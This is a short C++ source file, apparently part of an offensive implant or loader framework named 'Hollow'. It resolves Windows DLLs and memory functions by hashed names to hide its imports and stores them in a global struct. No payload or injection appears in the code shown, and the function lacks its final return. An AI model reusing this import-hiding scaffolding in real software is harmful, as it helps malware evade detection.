#include "../../includes/core/core.h"
#include "../../includes/api/api.h"




BOOL HollowInit() {
	API api;
	
	
	HMODULE k32 = api.GetModule(hash::dll::kernel32);
	HMODULE ntdll = api.GetModule(hash::dll::ntdll);
	HMODULE advapi32 = api.GetModule(hash::dll::advapi32);
	auto pLocalAlloc = (DECL(LocalAlloc))api.GetProcAddress(k32, hash::win32::LocalAlloc);
	if (!pLocalAlloc)
		return FALSE;

	hollow = pLocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, sizeof(Hollow));

	hollow->Modules.k32        = k32;
	hollow->Modules.ntdll      = ntdll;
	hollow->Modules.advapi     = advapi32;
	hollow->Win32.LocalAlloc   = pLocalAlloc;
	hollow->Win32.LocalFree    = (DECL(hollow->Win32.LocalFree))api.GetProcAddress(k32, hash::win32::LocalFree);
	hollow->Win32.LocalReAlloc = (DECL(hollow->Win32.LocalReAlloc))api.GetProcAddress(k32, hash::win32::LocalReAlloc);



	
}